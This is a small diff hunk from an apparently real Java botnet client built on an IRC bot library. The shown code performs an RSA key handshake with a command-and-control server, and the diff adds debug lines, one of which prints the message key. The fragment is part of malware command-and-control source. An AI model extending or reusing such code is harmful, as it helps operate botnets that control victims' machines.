@@ -282,10 +282,12 @@ public class BotnetClient extends PircBot {
 						leasedCommandRSA = null;
 					}
 					if (commandRSA.startsWith("key")) {
+						System.out.println("Shaking hands with CC");
 						String otherKey = m.decryptRSA(chat.readLine());
 						String info = m.decryptRSA(chat.readLine());
 						m.setPubParams(info);
 						m.handShake(otherKey);
+						System.out.println(m.msgKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
 					} else if (leased && leasedCommandRSA.startsWith("key")) {
